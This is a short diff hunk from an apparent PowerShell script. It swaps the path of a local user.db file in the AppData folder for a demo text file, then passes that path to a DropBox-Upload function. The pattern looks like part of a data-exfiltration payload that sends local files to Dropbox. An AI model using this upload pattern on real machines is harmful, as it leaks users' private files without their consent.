@@ -32,7 +32,7 @@ catch {
 }
 }
 
-$FileName = [Environment]::GetFolderPath('LocalApplicationData') + "\Microsoft\user.db"
+$FileName = "C:\Users\Moti\demo_macos.txt"
 $result = $false
 if (-not ([string]::IsNullOrEmpty($db))){
     $result = DropBox-Upload -f $FileName
